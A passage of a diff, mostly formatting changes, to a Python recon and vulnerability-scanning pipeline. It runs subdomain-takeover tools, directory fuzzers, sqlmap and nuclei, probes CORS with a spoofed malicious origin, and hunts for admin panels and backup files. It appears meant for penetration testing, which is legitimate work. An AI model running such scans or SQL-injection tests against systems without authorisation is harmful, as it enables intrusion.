\"-t\",\n+                            \"100\",\n+                            \"-timeout\",\n+                            \"30\",\n+                            \"-o\",\n+                            str(subjack_out),\n+                            \"-ssl\",\n+                        ],\n+                        env=env,\n+                        timeout=600,\n+                        check_return=False,\n+                    )\n \n                 # Run subzy\n                 if cfg.get(\"subdomain_takeover\", {}).get(\"subzy\", True):\n                     subzy_out = tdir / \"subzy_results.json\"\n                     run_subzy(subs_file, subzy_out, env, cfg)\n@@ -5305,13 +6871,16 @@\n \n     with ThreadPoolExecutor(max_workers=cfg[\"limits\"][\"max_concurrent_scans\"]) as ex:\n         futs = {ex.submit(per_target, t): t for t in targets}\n         for fut in as_completed(futs):\n             res = fut.result()\n-            logger.log(f\"Recon complete: {res.get('target')} -> {res.get('status')}\", \"INFO\")\n+            logger.log(\n+                f\"Recon complete: {res.get('target')} -> {res.get('status')}\", \"INFO\"\n+            )\n \n     logger.log(\"Enhanced recon stage complete\", \"SUCCESS\")\n+\n \n @monitor_performance(\"vuln_scan_stage\")\n def stage_vuln_scan(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):\n     logger.log(\"Enhanced vulnerability scan stage started\", \"INFO\")\n     vuln_dir = run_dir / \"vuln_scan\"\n@@ -5421,22 +6990,26 @@\n                 if wordlist:\n                     ffuf_out = tdir / \"ffuf_results.json\"\n                     run_ffuf(target_url, wordlist, ffuf_out, env)\n \n             if cfg.get(\"fuzzing\", {}).get(\"enable_feroxbuster\", True):\n-                logger.log(f\"Phase 15b: Feroxbuster directory fuzzing for {target}\", \"INFO\")\n+                logger.log(\n+                    f\"Phase 15b: Feroxbuster directory fuzzing for {target}\", \"INFO\"\n+                )\n                 wordlist = get_best_wordlist(\"directories\")\n                 if wordlist:\n                     ferox_out = tdir / \"feroxbuster_results.json\"\n                     run_feroxbuster(target_url, wordlist, ferox_out, env, cfg)\n                 logger.log(f\"Phase 12: SQL injection testing for {target}\", \"INFO\")\n                 sqlmap_out = tdir / \"sqlmap_results\"\n                 sqlmap_out.mkdir(exist_ok=True)\n                 run_sqlmap(target_url, sqlmap_out, env)\n \n             # Phase 13: Additional vulnerability checks from recon data\n-            logger.log(f\"Phase 13: Additional vulnerability checks for {target}\", \"INFO\")\n+            logger.log(\n+                f\"Phase 13: Additional vulnerability checks for {target}\", \"INFO\"\n+            )\n             additional_out = tdir / \"additional_vulns.json\"\n             perform_additional_checks(target, tdir, additional_out, cfg, env)\n \n             logger.log(f\"Vulnerability scanning completed for {target}\", \"SUCCESS\")\n \n@@ -5453,82 +7026,101 @@\n         logger.log(\"Applying ML-based vulnerability analysis\", \"INFO\")\n         ml_out = vuln_dir / \"ml_analysis_results.json\"\n         run_ml_vulnerability_analysis(vuln_dir, ml_out, cfg)\n \n     logger.log(\"Enhanced vulnerability scan stage complete\", \"SUCCESS\")\n+\n \n def check_security_headers(target: str, out_file: Path, env: Dict[str, str]):\n     \"\"\"Check for important security headers\"\"\"\n     security_headers = {\n         \"Strict-Transport-Security\": \"HSTS\",\n         \"Content-Security-Policy\": \"CSP\",\n         \"X-Frame-Options\": \"Clickjacking Protection\",\n         \"X-Content-Type-Options\": \"MIME Sniffing Protection\",\n         \"X-XSS-Protection\": \"XSS Protection\",\n         \"Referrer-Policy\": \"Referrer Policy\",\n-        \"Permissions-Policy\": \"Permissions Policy\"\n+        \"Permissions-Policy\": \"Permissions Policy\",\n     }\n \n     results = {\n         \"target\": target,\n         \"headers_present\": {},\n         \"headers_missing\": [],\n-        \"security_score\": 0\n+        \"security_score\": 0,\n     }\n \n     try:\n         if which(\"curl\"):\n-            result = run_cmd([\"curl\", \"-I\", \"-s\", \"-k\", target], capture=True, timeout=30, check_return=False)\n+            result = run_cmd(\n+                [\"curl\", \"-I\", \"-s\", \"-k\", target],\n+                capture=True,\n+                timeout=30,\n+                check_return=False,\n+            )\n             if result.stdout:\n                 headers = {}\n-                for line in result.stdout.split('\\n'):\n-                    if ':' in line:\n-                        key, value = line.split(':', 1)\n+                for line in result.stdout.split(\"\\n\"):\n+                    if \":\" in line:\n+                        key, value = line.split(\":\", 1)\n                         headers[key.strip()] = value.strip()\n \n                 for header, description in security_headers.items():\n                     if header in headers:\n                         results[\"headers_present\"][header] = {\n                             \"value\": headers[header],\n-                            \"description\": description\n+                            \"description\": description,\n                         }\n                         results[\"security_score\"] += 1\n                     else:\n-                        results[\"headers_missing\"].append({\n-                            \"header\": header,\n-                            \"description\": description\n-                        })\n-\n-                results[\"security_score\"] = (results[\"security_score\"] / len(security_headers)) * 100\n+                        results[\"headers_missing\"].append(\n+                            {\"header\": header, \"description\": description}\n+                        )\n+\n+                results[\"security_score\"] = (\n+                    results[\"security_score\"] / len(security_headers)\n+                ) * 100\n \n         atomic_write(out_file, json.dumps(results, indent=2))\n     except Exception as e:\n         logger.log(f\"Security headers check error: {e}\", \"WARNING\")\n+\n \n def check_cors_configuration(target: str, out_file: Path, env: Dict[str, str]):\n     \"\"\"Check CORS configuration for potential issues\"\"\"\n     cors_results = {\n         \"target\": target,\n         \"cors_enabled\": False,\n         \"wildcard_origin\": False,\n         \"credentials_allowed\": False,\n         \"unsafe_headers\": [],\n-        \"risk_level\": \"low\"\n+        \"risk_level\": \"low\",\n     }\n \n     try:\n         if which(\"curl\"):\n             # Test with a malicious origin\n-            result = run_cmd([\n-                \"curl\", \"-I\", \"-s\", \"-k\", \"-H\", \"Origin: https://malicious.com\", target\n-            ], capture=True, timeout=30, check_return=False)\n+            result = run_cmd(\n+                [\n+                    \"curl\",\n+                    \"-I\",\n+                    \"-s\",\n+                    \"-k\",\n+                    \"-H\",\n+                    \"Origin: https://malicious.com\",\n+                    target,\n+                ],\n+                capture=True,\n+                timeout=30,\n+                check_return=False,\n+            )\n \n             if result.stdout:\n                 headers = {}\n-                for line in result.stdout.split('\\n'):\n-                    if ':' in line:\n-                        key, value = line.split(':', 1)\n+                for line in result.stdout.split(\"\\n\"):\n+                    if \":\" in line:\n+                        key, value = line.split(\":\", 1)\n                         headers[key.strip().lower()] = value.strip()\n \n                 if \"access-control-allow-origin\" in headers:\n                     cors_results[\"cors_enabled\"] = True\n                     origin_value = headers[\"access-control-allow-origin\"]\n@@ -5544,39 +7136,53 @@\n                     if headers[\"access-control-allow-credentials\"].lower() == \"true\":\n                         cors_results[\"credentials_allowed\"] = True\n                         if cors_results[\"wildcard_origin\"]:\n                             cors_results[\"risk_level\"] = \"critical\"\n \n-                dangerous_headers = [\"access-control-allow-headers\", \"access-control-allow-methods\"]\n+                dangerous_headers = [\n+                    \"access-control-allow-headers\",\n+                    \"access-control-allow-methods\",\n+                ]\n                 for header in dangerous_headers:\n                     if header in headers and \"*\" in headers[header]:\n                         cors_results[\"unsafe_headers\"].append(header)\n                         cors_results[\"risk_level\"] = \"high\"\n \n         atomic_write(out_file, json.dumps(cors_results, indent=2))\n     except Exception as e:\n         logger.log(f\"CORS analysis error: {e}\", \"WARNING\")\n \n+\n def _check_admin_panels(target: str) -> List[str]:\n     \"\"\"Check for exposed admin panels\"\"\"\n     admin_paths = [\n-        \"/admin\", \"/administrator\", \"/admin.php\", \"/admin/login.php\",\n-        \"/wp-admin\", \"/administrator/\", \"/admin/index.php\", \"/admin/admin.php\",\n-        \"/login\", \"/login.php\", \"/signin\", \"/signin.php\"\n+        \"/admin\",\n+        \"/administrator\",\n+        \"/admin.php\",\n+        \"/admin/login.php\",\n+        \"/wp-admin\",\n+        \"/administrator/\",\n+        \"/admin/index.php\",\n+        \"/admin/admin.php\",\n+        \"/login\",\n+        \"/login.php\",\n+        \"/signin\",\n+        \"/signin.php\",\n     ]\n \n     found_panels = []\n     if not which(\"curl\"):\n         return found_panels\n \n     for path in admin_paths:\n-        full_url = target.rstrip('/') + path\n+        full_url = target.rstrip(\"/\") + path\n         response = safe_http_request(full_url, timeout=10)\n         if response and (\"200 OK\" in response or \"302 Found\" in response):\n             found_panels.append(path)\n \n     return found_panels\n+\n \n def _check_backup_files(target: str) -> List[str]:\n     \"\"\"Check for exposed backup files\"\"\"\n     backup_extensions = [\".bak\", \".backup\", \".old\", \".orig\", \".save\", \".tmp\"]\n     common_files = [\"index\", \"config\", \"database\", \"db\", \"admin\", \"login\"]\n@@ -5592,100 +7198,114 @@\n             if response and \"200 OK\" in response:\n                 found_backups.append(f\"{file}{ext}\")\n \n     return found_backups\n \n+\n def _check_robots_txt(target: str) -> List[str]:\n     \"\"\"Analyze robots.txt for sensitive information\"\"\"\n     disallowed = []\n     if not which(\"curl\"):\n         return disallowed\n \n     robots_url = f\"{target.rstrip('/')}/robots.txt\"\n     response = safe_http_request(robots_url, timeout=10)\n \n     if response and \"disallow\" in response.lower():\n-        for line in response.split('\\n'):\n-            if line.lower().startswith('disallow:'):\n-                path = line.split(':', 1)[1].strip()\n-                if path and path != '/':\n+        for line in response.split(\"\\n\"):\n+            if line.lower().startswith(\"disallow:\"):\n+                path = line.split(\":\", 1)[1].strip()\n+                if path and path != \"/\":\n                     disallowed.append(path)\n \n     return disallowed[:10]  # Limit to first 10\n \n-def perform_additional_checks(target: str, target_dir: Path, out_file: Path, cfg: Dict[str, Any], env: Dict[str, str]):\n+\n+def perform_additional_checks(\n+    target: str,\n+    target_dir: Path,\n+    out_file: Path,\n+    cfg: Dict[str, Any],\n+    env: Dict[str, str],\n+):\n     \"\"\"Perform additional vulnerability checks based on discovered services\"\"\"\n     additional_vulns = {\n         \"target\": target,\n         \"checks_performed\": [],\n         \"vulnerabilities\": [],\n-        \"recommendations\": []\n+        \"recommendations\": [],\n     }\n \n     def _perform_checks():\n         # Check for common admin panels\n         additional_vulns[\"checks_performed\"].append(\"Admin panel discovery\")\n         found_panels = _check_admin_panels(target)\n         if found_panels:\n-            additional_vulns[\"vulnerabilities\"].append({\n-                \"type\": \"Exposed Admin Panels\",\n-                \"severity\": \"medium\",\n-                \"description\": f\"Found {len(found_panels)} potential admin panels\",\n-                \"details\": found_panels\n-            })\n+            additional_vulns[\"vulnerabilities\"].append(\n+                {\n+                    \"type\": \"Exposed Admin Panels\",\n+                    \"severity\": \"medium\",\n+                    \"description\": f\"Found {len(found_panels)} potential admin panels\",\n+                    \"details\": found_panels,\n+                }\n+            )\n \n         # Check for common backup files\n         additional_vulns[\"checks_performed\"].append(\"Backup file discovery\")\n         found_backups = _check_backup_files(target)\n         if found_backups:\n-            additional_vulns[\"vulnerabilities\"].append({\n-                \"type\": \"Exposed Backup Files\",\n-                \"severity\": \"high\",\n-                \"description\": f\"Found {len(found_backups)} potential backup files\",\n-                \"details\": found_backups\n-            })\n+            additional_vulns[\"vulnerabilities\"].append(\n+                {\n+                    \"type\": \"Exposed Backup Files\",\n+                    \"severity\": \"high\",\n+                    \"description\": f\"Found {len(found_backups)} potential backup files\",\n+                    \"details\": found_backups,\n+                }\n+            )\n \n         # Check robots.txt for sensitive information\n         additional_vulns[\"checks_performed\"].append(\"Robots.txt analysis\")\n         disallowed_paths = _check_robots_txt(target)\n         if disallowed_paths:\n-            additional_vulns[\"vulnerabilities\"].append({\n-                \"type\": \"Robots.txt Information Disclosure\",\n-                \"severity\": \"low\",\n-                \"description\": \"Robots.txt reveals potentially sensitive paths\",\n-                \"details\": disallowed_paths\n-            })\n+            additional_vulns[\"vulnerabilities\"].append(\n+                {\n+                    \"type\": \"Robots.txt Information Disclosure\",\n+                    \"severity\": \"low\",\n+                    \"description\": \"Robots.txt reveals potentially sensitive paths\",\n+                    \"details\": disallowed_paths,\n+                }\n+            )\n \n         # Generate recommendations\n         if additional_vulns[\"vulnerabilities\"]:\n-            additional_vulns[\"recommendations\"].extend([\n-                \"Review and secure exposed admin panels\",\n-                \"Remove or protect backup files\",\n-                \"Implement proper access controls\",\n-                \"Regular security assessments\"\n-            ])\n+            additional_vulns[\"recommendations\"].extend(\n+                [\n+                    \"Review and secure exposed admin panels\",\n+                    \"Remove or protect backup files\",\n+                    \"Implement proper access controls\",\n+                    \"Regular security assessments\",\n+                ]\n+            )\n \n         return atomic_write(out_file, json.dumps(additional_vulns, indent=2))\n \n-    safe_execute(\n-        _perform_checks,\n-        default=False,\n-        error_msg=\"Additional checks failed\"\n-    )\n+    safe_execute(_perform_checks, default=False, error_msg=\"Additional checks failed\")\n+\n \n @monitor_performance(\"report_stage\")\n def stage_report(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):\n     logger.log(\"Enhanced reporting stage started with intelligent analysis\", \"INFO\")\n     report_dir = run_dir / \"report\"\n     report_dir.mkdir(exist_ok=True)\n \n     recon_results: Dict[str, Any] = {}\n     vuln_results: Dict[str, Any] = {}\n-    \n+\n     # Try to import enhanced reporting components\n     try:\n         from enhanced_report_controller import EnhancedReportController\n+\n         enhanced_reporting_available = True\n         logger.log(\"Enhanced reporting engine loaded successfully\", \"SUCCESS\")\n     except ImportError as e:\n         enhanced_reporting_available = False\n         logger.log(f\"Enhanced reporting engine not available: {e}\", \"WARNING\")\n@@ -5706,39 +7326,45 @@\n                 \"http_info\": [],\n                 \"technology_stack\": {},\n                 \"ssl_info\": {},\n                 \"network_info\": {},\n                 \"directories\": [],\n-                \"dns_info\": {}\n+                \"dns_info\": {},\n             }\n \n             # Parse port information\n             op = td / \"open_ports.txt\"\n             if op.exists():\n-                for line in op.read_text(encoding=\"utf-8\", errors=\"ignore\").splitlines():\n+                for line in op.read_text(\n+                    encoding=\"utf-8\", errors=\"ignore\"\n+                ).splitlines():\n                     l = line.strip()\n                     if l and \":\" in l:\n                         try:\n                             h, port = l.rsplit(\":\", 1)\n-                            target_data[\"open_ports\"].append({\"host\": h, \"port\": int(port), \"proto\": \"tcp\"})\n+                            target_data[\"open_ports\"].append(\n+                                {\"host\": h, \"port\": int(port), \"proto\": \"tcp\"}\n+                            )\n                         except Exception as e:\n                             logging.warning(f\"Operation failed: {e}\")\n             # Consider if this error should be handled differently\n             # Parse HTTP information\n             httpx = td / \"httpx_output.jsonl\"\n             if httpx.exists():\n-                for line in httpx.read_text(encoding=\"utf-8\", errors=\"ignore\").splitlines():\n+                for line in httpx.read_text(\n+                    encoding=\"utf-8\", errors=\"ignore\"\n+                ).splitlines():\n                     try:\n                         target_data[\"http_info\"].append(json.loads(line))\n                     except Exception as e:\n                         logging.warning(f\"Operation failed: {e}\")\n             # Consider if this error should be handled differently\n             # Load additional data files\n             additional_files = {\n                 \"dns_info.json\": \"dns_info\",\n                 \"whatweb.json\": \"technology_stack\",\n-                \"ssl_analysis.json\": \"ssl_info\"\n+                \"ssl_analysis.json\": \"ssl_info\",\n             }\n \n             for filename, key in additional_files.items():\n                 file_path = td / filename\n                 if file_path.exists():\n@@ -5754,11 +7380,11 @@\n                 for file in network_dir.glob(\"*.txt\"):\n                     try:\n                         network_info[file.stem] = file.read_text()\n                     except Exception as e:\n                         logging.warning(f\"Operation failed: {e}\")\n-            # Consider if this error should be handled differently\n+                # Consider if this error should be handled differently\n                 target_data[\"network_info\"] = network_info\n \n             recon_results[tname] = target_data\n \n     # Load vulnerability scan results\n@@ -5774,39 +7400,55 @@\n                 \"nuclei_parsed\": [],\n                 \"security_headers\": {},\n                 \"cors_analysis\": {},\n                 \"nikto_results\": {},\n                 \"additional_vulns\": {},\n-                \"risk_score\": 0\n+                \"risk_score\": 0,\n             }\n \n             # Parse Nuclei results\n             nuc = td / \"nuclei_results.jsonl\"\n             if nuc.exists():\n-                nuclei_lines = nuc.read_text(encoding=\"utf-8\", errors=\"ignore\").splitlines()\n+                nuclei_lines = nuc.read_text(\n+                    encoding=\"utf-8\", errors=\"ignore\"\n+                ).splitlines()\n                 vuln_data[\"nuclei_raw\"] = nuclei_lines\n \n                 # Parse and categorize nuclei findings\n-                parsed_nuclei = {\"critical\": [], \"high\": [], \"medium\": [], \"low\": [], \"info\": []}\n+                parsed_nuclei = {\n+                    \"critical\": [],\n+                    \"high\": [],\n+                    \"medium\": [],\n+                    \"low\": [],\n+                    \"info\": [],\n+                }\n                 for line in nuclei_lines:\n                     try:\n                         finding = json.loads(line)\n-                        severity = finding.get(\"info\", {}).get(\"severity\", \"unknown\").lower()\n+                        severity = (\n+                            finding.get(\"info\", {}).get(\"severity\", \"unknown\").lower()\n+                        )\n                         if severity in parsed_nuclei:\n                             parsed_nuclei[severity].append(finding)\n-                        vuln_data[\"risk_score\"] += {\"critical\": 10, \"high\": 7, \"medium\": 4, \"low\": 2, \"info\": 1}.get(severity, 0)\n+                        vuln_data[\"risk_score\"] += {\n+                            \"critical\": 10,\n+                            \"high\": 7,\n+                            \"medium\": 4,\n+                            \"low\": 2,\n+                            \"info\": 1,\n+                        }.get(severity, 0)\n                     except Exception as e:\n                         logging.warning(f\"Operation failed: {e}\")\n-            # Consider if this error should be handled differently\n+                # Consider if this error should be handled differently\n                 vuln_data[\"nuclei_parsed\"] = parsed_nuclei\n \n             # Load additional vulnerability data\n             additional_vuln_files = {\n                 \"security_headers.json\": \"security_headers\",\n                 \"cors_analysis.json\": \"cors_analysis\",\n                 \"nikto_results.json\": \"nikto_results\",\n-                \"additional_vulns.json\": \"additional_vulns\"\n+                \"additional_vulns.json\": \"additional_vulns\",\n             }\n \n             for filename, key in additional_vuln_files.items():\n                 file_path = td / filename\n                 if file_path.exists():\n@@ -5817,90 +7459,114 @@\n             # Consider if this error should be handled differently\n             vuln_results[tname] = vuln_data\n \n     # Get target list for analysis\n     targets = read_lines(TARGETS)\n-    \n+\n     # Choose reporting approach based on availability and configuration\n-    if enhanced_reporting_available and cfg.get(\"enhanced_reporting\", {}).get(\"enabled\", True):\n+    if enhanced_reporting_available and cfg.get(\"enhanced_reporting\", {}).get(\n+        \"enabled\", True\n+    ):\n         logger.log(\"Generating report with enhanced intelligent analysis\", \"INFO\")\n         try:\n             # Create a compatible logger for the enhanced controller\n             import logging\n-            compatible_logger = logging.getLogger('enhanced_report')\n+\n+            compatible_logger = logging.getLogger(\"enhanced_report\")\n             if not compatible_logger.handlers:\n                 compatible_logger.setLevel(logging.INFO)\n                 handler = logging.StreamHandler()\n-                formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')\n+                formatter = logging.Formatter(\n+                    \"%(asctime)s - %(levelname)s - %(message)s\"\n+                )\n                 handler.setFormatter(formatter)\n                 compatible_logger.addHandler(handler)\n-            \n+\n             # Initialize enhanced report controller\n             enhanced_controller = EnhancedReportController(cfg, compatible_logger)\n-            \n+\n             # Generate enhanced report with intelligent analysis\n             enhanced_report_data = enhanced_controller.generate_enhanced_report(\n                 run_dir, recon_results, vuln_results, targets\n             )\n-            \n+\n             # Save enhanced report\n-            atomic_write(report_dir / \"enhanced_report.json\", json.dumps(enhanced_report_data, indent=2))\n+            atomic_write(\n+                report_dir / \"enhanced_report.json\",\n+                json.dumps(enhanced_report_data, indent=2),\n+            )\n             logger.log(\"Enhanced intelligent report generated successfully\", \"SUCCESS\")\n-            \n+\n             # Generate enhanced HTML report\n             generate_enhanced_intelligent_html_report(enhanced_report_data, report_dir)\n             logger.log(\"Enhanced intelligent HTML report generated\", \"SUCCESS\")\n-            \n+\n             # Also generate standard report for compatibility\n             overall_risk = calculate_risk_score(vuln_results)\n             standard_report_data = {\n                 \"run_id\": run_dir.name,\n                 \"timestamp\": datetime.now().isoformat(),\n                 \"targets\": targets,\n                 \"recon_results\": recon_results,\n                 \"vuln_scan_results\": vuln_results,\n                 \"configuration\": cfg,\n                 \"risk_assessment\": overall_risk,\n-                \"executive_summary\": generate_executive_summary(recon_results, vuln_results, overall_risk)\n+                \"executive_summary\": generate_executive_summary(\n+                    recon_results, vuln_results, overall_risk\n+                ),\n             }\n-            \n+\n             # Save both enhanced and standard reports\n             formats = cfg.get(\"report\", {}).get(\"formats\", [\"html\", \"json\"])\n-            \n+\n             if \"json\" in formats:\n-                atomic_write(report_dir / \"report.json\", json.dumps(standard_report_data, indent=2))\n-                logger.log(\"Standard JSON report generated for compatibility\", \"SUCCESS\")\n-            \n+                atomic_write(\n+                    report_dir / \"report.json\",\n+                    json.dumps(standard_report_data, indent=2),\n+                )\n+                logger.log(\n+                    \"Standard JSON report generated for compatibility\", \"SUCCESS\"\n+                )\n+\n             if \"csv\" in formats:\n                 generate_csv_report(standard_report_data, report_dir)\n                 logger.log(\"CSV report generated\", \"SUCCESS\")\n-            \n+\n             if \"sari\" in formats:\n                 generate_sarif_report(standard_report_data, report_dir)\n                 logger.log(\"SARIF report generated\", \"SUCCESS\")\n-            \n+\n             logger.log(f\"Enhanced intelligent report written: {report_dir}\", \"SUCCESS\")\n-            \n+\n         except Exception as e:\n             logger.log(f\"Enhanced reporting failed: {e}\", \"ERROR\")\n             logger.log(\"Falling back to standard reporting\", \"WARNING\")\n             enhanced_reporting_available = False\n-    \n+\n     # Standard reporting fallback\n-    if not enhanced_reporting_available or not cfg.get(\"enhanced_reporting\", {}).get(\"enabled\", True):\n+    if not enhanced_reporting_available or not cfg.get(\"enhanced_reporting\", {}).get(\n+        \"enabled\", True\n+    ):\n         logger.log(\"Generating standard report\", \"INFO\")\n-        \n+\n         # Calculate overall risk assessment\n         try:\n             overall_risk = calculate_risk_score(vuln_results)\n             logger.log(\"Risk score calculation completed\", \"DEBUG\")\n         except Exception as e:\n             logger.log(f\"Risk calculation failed: {e}\", \"ERROR\")\n-            overall_risk = {\"total_score\": 0, \"risk_level\": \"UNKNOWN\", \"severity_breakdown\": {}, \"recommendations\": []}\n+            overall_risk = {\n+                \"total_score\": 0,\n+                \"risk_level\": \"UNKNOWN\",\n+                \"severity_breakdown\": {},\n+                \"recommendations\": [],\n+            }\n \n         try:\n-            executive_summary = generate_executive_summary(recon_results, vuln_results, overall_risk)\n+            executive_summary = generate_executive_summary(\n+                recon_results, vuln_results, overall_risk\n+            )\n             logger.log(\"Executive summary generation completed\", \"DEBUG\")\n         except Exception as e:\n             logger.log(f\"Executive summary generation failed: {e}\", \"ERROR\")\n             executive_summary = {\"error\": f\"Summary generation failed: {e}\"}\n \n@@ -5910,11 +7576,11 @@\n             \"targets\": targets,\n             \"recon_results\": recon_results,\n             \"vuln_scan_results\": vuln_results,\n             \"configuration\": cfg,\n             \"risk_assessment\": overall_risk,\n-            \"executive_summary\": executive_summary\n+            \"executive_summary\": executive_summary,\n         }\n \n         # Generate reports in multiple formats\n         formats = cfg.get(\"report\", {}).get(\"formats\", [\"html\", \"json\"])\n \n@@ -5933,33 +7599,43 @@\n         if \"html\" in formats:\n             generate_enhanced_html_report(report_data, report_dir)\n             logger.log(\"Enhanced HTML report generated\", \"SUCCESS\")\n \n         logger.log(f\"Standard report written: {report_dir}\", \"SUCCESS\")\n+\n \n def calculate_risk_score(vuln_results: Dict[str, Any]) -> Dict[str, Any]:\n     \"\"\"Calculate overall risk assessment\"\"\"\n     total_score = 0\n     severity_counts = {\"critical\": 0, \"high\": 0, \"medium\": 0, \"low\": 0, \"info\": 0}\n \n     # Safety check: ensure vuln_results is a dictionary\n     if not isinstance(vuln_results, dict):\n-        logger.log(f\"Warning: vuln_results is not a dictionary, got {type(vuln_results)}\", \"WARNING\")\n+        logger.log(\n+            f\"Warning: vuln_results is not a dictionary, got {type(vuln_results)}\",\n+            \"WARNING\",\n+        )\n         vuln_results = {}\n \n     for target, data in vuln_results.items():\n         # Safety check: ensure data is a dictionary\n         if not isinstance(data, dict):\n-            logger.log(f\"Warning: data for target {target} is not a dictionary, skipping\", \"WARNING\")\n+            logger.log(\n+                f\"Warning: data for target {target} is not a dictionary, skipping\",\n+                \"WARNING\",\n+            )\n             continue\n \n         total_score += data.get(\"risk_score\", 0)\n         nuclei_parsed = data.get(\"nuclei_parsed\", {})\n \n         # Safety check: ensure nuclei_parsed is a dictionary\n         if not isinstance(nuclei_parsed, dict):\n-            logger.log(f\"Warning: nuclei_parsed for target {target} is not a dictionary, skipping\", \"DEBUG\")\n+            logger.log(\n+                f\"Warning: nuclei_parsed for target {target} is not a dictionary, skipping\",\n+                \"DEBUG\",\n+            )\n             continue\n \n         for severity, findings in nuclei_parsed.items():\n             if severity in severity_counts and isinstance(findings, (list, tuple)):\n                 severity_counts[severity] += len(findings)\n@@ -5978,62 +7654,89 @@\n \n     return {\n         \"total_score\": total_score,\n         \"risk_level\": risk_level,\n         \"severity_breakdown\": severity_counts,\n-        \"recommendations\": generate_risk_recommendations(risk_level, severity_counts)\n+        \"recommendations\": generate_risk_recommendations(risk_level, severity_counts),\n     }\n \n-def generate_risk_recommendations(risk_level: str, severity_counts: Dict[str, int]) -> List[str]:\n+\n+def generate_risk_recommendations(\n+    risk_level: str, severity_counts: Dict[str, int]\n+) -> List[str]:\n     \"\"\"Generate recommendations based on risk level\"\"\"\n     recommendations = []\n \n     if severity_counts[\"critical\"] > 0:\n-        recommendations.append(\"[CRITICAL] IMMEDIATE ACTION REQUIRED: Critical vulnerabilities found\")\n+        recommendations.append(\n+            \"[CRITICAL] IMMEDIATE ACTION REQUIRED: Critical vulnerabilities found\"\n+        )\n         recommendations.append(\"\u2022 Patch critical vulnerabilities immediately\")\n-        recommendations.append(\"\u2022 Consider taking affected systems offline until patched\")\n+        recommendations.append(\n+            \"\u2022 Consider taking affected systems offline until patched\"\n+        )\n \n     if severity_counts[\"high\"] > 0:\n-        recommendations.append(\"\ud83d\udd34 HIGH PRIORITY: Address high-severity vulnerabilities within 24-48 hours\")\n+        recommendations.append(\n+            \"\ud83d\udd34 HIGH PRIORITY: Address high-severity vulnerabilities within 24-48 hours\"\n+        )\n         recommendations.append(\"\u2022 Review and patch high-severity findings\")\n         recommendations.append(\"\u2022 Implement additional monitoring\")\n \n     if severity_counts[\"medium\"] > 0:\n-        recommendations.append(\"\ud83d\udfe1 MEDIUM PRIORITY: Address medium-severity vulnerabilities within 1-2 weeks\")\n+        recommendations.append(\n+            \"\ud83d\udfe1 MEDIUM PRIORITY: Address medium-severity vulnerabilities within 1-2 weeks\"\n+        )\n         recommendations.append(\"\u2022 Plan patching for medium-severity issues\")\n         recommendations.append(\"\u2022 Review configuration hardening\")\n \n-    recommendations.extend([\n-        \"\u2022 Regular security assessments\",\n-        \"\u2022 Implement security headers\",\n-        \"\u2022 Review access controls\",\n-        \"\u2022 Security awareness training\"\n-    ])\n+    recommendations.extend(\n+        [\n+            \"\u2022 Regular security assessments\",\n+            \"\u2022 Implement security headers\",\n+            \"\u2022 Review access controls\",\n+            \"\u2022 Security awareness training\",\n+        ]\n+    )\n \n     return recommendations\n \n-def generate_executive_summary(recon_results: Dict[str, Any], vuln_results: Dict[str, Any], risk_assessment: Dict[str, Any]) -> Dict[str, Any]:\n+\n+def generate_executive_summary(\n+    recon_results: Dict[str, Any],\n+    vuln_results: Dict[str, Any],\n+    risk_assessment: Dict[str, Any],\n+) -> Dict[str, Any]:\n     \"\"\"Generate executive summary with enhanced safety checks\"\"\"\n-    \n+\n     # Safety checks for input parameters\n     if not isinstance(recon_results, dict):\n-        logger.log(f\"Warning: recon_results is not a dictionary, got {type(recon_results)}\", \"DEBUG\")\n+        logger.log(\n+            f\"Warning: recon_results is not a dictionary, got {type(recon_results)}\",\n+            \"DEBUG\",\n+        )\n         recon_results = {}\n-    \n+\n     if not isinstance(vuln_results, dict):\n-        logger.log(f\"Warning: vuln_results is not a dictionary, got {type(vuln_results)}\", \"DEBUG\")\n+        logger.log(\n+            f\"Warning: vuln_results is not a dictionary, got {type(vuln_results)}\",\n+            \"DEBUG\",\n+        )\n         vuln_results = {}\n-    \n+\n     if not isinstance(risk_assessment, dict):\n-        logger.log(f\"Warning: risk_assessment is not a dictionary, got {type(risk_assessment)}\", \"DEBUG\")\n+        logger.log(\n+            f\"Warning: risk_assessment is not a dictionary, got {type(risk_assessment)}\",\n+            \"DEBUG\",\n+        )\n         risk_assessment = {\"severity_breakdown\": {}, \"risk_level\": \"UNKNOWN\"}\n-    \n+\n     # Calculate totals with safety checks\n     total_subdomains = 0\n     total_ports = 0\n     total_services = 0\n-    \n+\n     for data in recon_results.values():\n         if isinstance(data, dict):\n             total_subdomains += len(data.get(\"subdomains\", []))\n             total_ports += len(data.get(\"open_ports\", []))\n             total_services += len(data.get(\"http_info\", []))\n@@ -6044,43 +7747,58 @@\n         \"open_ports_found\": total_ports,\n         \"http_services_identified\": total_services,\n         \"vulnerabilities_found\": risk_assessment.get(\"severity_breakdown\", {}),\n         \"overall_risk\": risk_assessment.get(\"risk_level\", \"UNKNOWN\"),\n         \"key_findings\": extract_key_findings(vuln_results),\n-        \"scan_completion\": datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n+        \"scan_completion\": datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\"),\n     }\n+\n \n def extract_key_findings(vuln_results: Dict[str, Any]) -> List[str]:\n     \"\"\"Extract key findings for executive summary\"\"\"\n     findings = []\n \n     # Safety check: ensure vuln_results is a dictionary\n     if not isinstance(vuln_results, dict):\n-        logger.log(f\"Warning: vuln_results is not a dictionary, got {type(vuln_results)}\", \"DEBUG\")\n+        logger.log(\n+            f\"Warning: vuln_results is not a dictionary, got {type(vuln_results)}\",\n+            \"DEBUG\",\n+        )\n         return findings\n \n     for target, data in vuln_results.items():\n         # Safety check: ensure data is a dictionary\n         if not isinstance(data, dict):\n-            logger.log(f\"Warning: data for target {target} is not a dictionary, skipping\", \"DEBUG\")\n+            logger.log(\n+                f\"Warning: data for target {target} is not a dictionary, skipping\",\n+                \"DEBUG\",\n+            )\n             continue\n-            \n+\n         nuclei_parsed = data.get(\"nuclei_parsed\", {})\n-        \n+\n         # Safety check: ensure nuclei_parsed is a dictionary\n         if not isinstance(nuclei_parsed, dict):\n-            logger.log(f\"Warning: nuclei_parsed for target {target} is not a dictionary, skipping\", \"DEBUG\")\n+            logger.log(\n+                f\"Warning: nuclei_parsed for target {target} is not a dictionary, skipping\",\n+                \"DEBUG\",\n+            )\n             continue\n \n         # Safety check: ensure nuclei_parsed is a 